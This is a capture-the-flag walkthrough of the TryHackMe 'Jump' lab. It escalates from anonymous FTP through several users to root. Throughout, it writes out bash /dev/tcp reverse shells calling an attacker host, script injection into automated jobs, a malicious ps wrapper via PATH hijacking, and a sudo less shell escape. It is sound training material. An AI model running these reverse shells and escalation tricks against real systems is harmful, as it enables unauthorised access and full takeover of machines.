# [Jump](https://tryhackme.com/room/jump)

## Use privilege escalation knowledge to jump from a normal user to root.

# Challenge

You’ve discovered a misconfigured internal automation pipeline running on a Linux server. The system processes recon scripts, development backups, monitoring jobs, and deployment tasks across multiple users. Each stage of the pipeline relies too heavily on the previous one. By abusing these trust boundaries, you must move laterally through the system.

Your objective is to escalate from anonymous access all the way through: `recon_user → dev_user → monitor_user → ops_user → root`

### What is the flag found in the recon_user’s home directory?

1. Start with a full port scan and service probe to discover what the machine exposes.

```bash
nmap -sVC -p- <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:<ATTACKER_IP>
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 115      123          4096 Apr 30 06:00 incoming [NSE: writeable]
|_drwxr-xr-x    5 115      123          4096 Feb 02 07:19 pub
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 5f:0a:25:3f:3d:40:6d:14:98:16:e6:51:ed:24:a6:98 (ECDSA)
|_  256 23:6c:70:e4:33:dd:e2:e0:0b:06:8e:b0:69:54:e5:ff (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Anonymous FTP is allowed, so connect and inspect the public directories.

```bash
ftp <TARGET_IP>
anonymous
ls -la
cd pub
ls -la
get README.txt
```

**Results:**

```
[ recon pipeline ]

All recon jobs must be placed in incoming/.
Files are processed automatically on arrival.
Invalid formats are ignored.
```

3. The readme indicates `incoming/` is processed automatically. Create a reverse shell script and upload it there.

```sh
#!/bin/bash
bash -c '/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

4. Prepare a listener on your machine and wait for the pipeline to execute the uploaded script.

```bash
nc -lvnp 4444
```

5. Upload `recon.sh` to the `incoming/` directory.

```bash
put recon.sh
```

6. Once the reverse shell connects, verify your identity and read the first flag.

```bash
cat flag.txt
```

[SCREEN01]

---

### What is the flag found in the dev_user’s home directory?

1. After gaining a shell as `recon_user`, confirm your group membership so you know what resources are accessible.

```bash
id
```

**Results:**

```
uid=1001(recon_user) gid=1001(recon_user) groups=1001(recon_user),1002(dev_user),1005(devops)
```

> This shows `recon_user` belongs to `dev_user` and `devops`, so files owned by those groups are likely accessible.

2. Inspect the development automation script to see if it contains a privilege escalation path.

```bash
cat /opt/dev/backup.sh
```

**Results:**

```sh
#!/bin/bash
tar -czf /tmp/recon_backup.tgz /home/recon_user
bash -i >& /dev/tcp/10.82.84.138/5556 0>&1
bash -i >& /dev/tcp/10.82.84.138/5556 0>&1
bash -i >& /dev/tcp/10.82.84.138/5556 0>&1
bash -i >& /dev/tcp/10.82.84.138/5556 0>&1
```

> The backup script is clearly dangerous: it packs `recon_user` home and includes reverse shell commands. This is the pivot into `dev_user` trust.

3. Open a listener for the shell that will be spawned by the modified backup process.

```bash
nc -lvnp 5555
```

4. Inject a stable reverse shell line into `backup.sh`, using the port you are listening on.

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/5555 0>&1' >> /opt/dev/backup.sh
```

5. Trigger the backup process by uploading any script into the pipeline. The automation will detect the new file and run its backup routine.

```sh
#!/bin/bash
echo test
```

6. When the pipeline runs, it executes `/opt/dev/backup.sh` and connects back to your listener. You now have a shell that can access `dev_user` resources.

```bash
cat flag.txt
```

[SCREEN02]

---

### What is the flag found in the monitor_user’s home directory?

1. The next escalation comes from a systemd service running as `monitor_user`. Inspect the service unit and the healthcheck binary.

```bash
cat /etc/systemd/system/healthcheck.service
cat /usr/local/bin/healthcheck
```

**Results:**

```
[Unit]
Description=System Health Check

[Service]
Type=simple
User=monitor_user
Environment=PATH=/opt/dev/bin:/usr/local/bin:/usr/bin
ExecStart=/usr/local/bin/healthcheck
```

```bash
#!/bin/bash
echo "Running as: $(whoami)"
while true; do
  ps aux | grep -v grep
  sleep 5
done
```

> The service runs as `monitor_user` and uses a custom `PATH` which includes `/opt/dev/bin` before `/usr/bin`.

2. Prepare a listener for the new shell.

```bash
nc -lvnp 6666
```

3. Create a malicious ps wrapper in `/opt/dev/bin`, which is earlier in the service PATH. When the healthcheck service runs `ps aux`, it will execute your payload instead.

```bash
echo -e '#!/bin/bash\nsetsid bash -i >& /dev/tcp/<ATTACKER_IP>/6666 0>&1 &\nexec /usr/bin/ps "$@"' > /opt/dev/bin/ps
chmod +x /opt/dev/bin/ps
```

4. Wait for the healthcheck service to run again. Because it loops continuously, it will call your wrapper and connect back with a shell running as `monitor_user`.

5. Once you have the shell, read the monitor user flag.

```bash
cat /home/monitor_user/flag.txt
```

[SCREEN03]

---

### What is the flag found in the ops_user’s home directory?

1. From `monitor_user`, find files owned by `ops_user` to identify privileged scripts.

```bash
find / -user ops_user -type f 2>/dev/null
```

**Results:**

```
/usr/local/bin/deploy.sh
```

2. Check sudo permissions for `monitor_user`.

```bash
sudo -l
```

**Results:**

```
Matching Defaults entries for monitor_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User monitor_user may run the following commands on tryhackme-2404:
    (ops_user) NOPASSWD: /usr/local/bin/deploy.sh
```

> You can run `deploy.sh` as `ops_user` without a password.

3. Inspect the deploy script and helper to see how it works.

```bash
cat /usr/local/bin/deploy.sh
cat /opt/app/deploy_helper.sh
```

**Results:**

```bash
#!/bin/bash
cd /opt/app 2>/dev/null
./deploy_helper.sh
```

```sh
#!/bin/bash
echo "[+] Deploy helper running"
echo "[+] Syncing application files"
sleep 2
```

4. Prepare a listener for the new shell.

```bash
nc -lvnp 7777
```

5. Add a reverse shell payload to `deploy_helper.sh`.

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/7777 0>&1 &' >> /opt/app/deploy_helper.sh
```

6. Run the deploy script as `ops_user` to execute the modified helper.

```bash
sudo -u ops_user /usr/local/bin/deploy.sh
```

7. The helper connects back to your listener, giving you an `ops_user` shell. Read the ops flag.

```bash
cat /home/ops_user/flag.txt
```

[SCREEN04]

---

### What is the flag found in the root user's home directory?

1. Check `sudo` permissions for `ops_user`.

```bash
sudo -l
```

**Results:**

```
Matching Defaults entries for ops_user on tryhackme-2404:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LESS

User ops_user may run the following commands on tryhackme-2404:
    (root) NOPASSWD: /usr/bin/less
```

2. Improve your shell first, then use `less` to execute a shell as root.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

3. Use `sudo` with `less` on a readable file and drop into a shell.

```bash
sudo /usr/bin/less /etc/hosts
!/bin/sh
```

4. Now read the root flag.

```bash
cat /root/flag.txt
```

[SCREEN05]
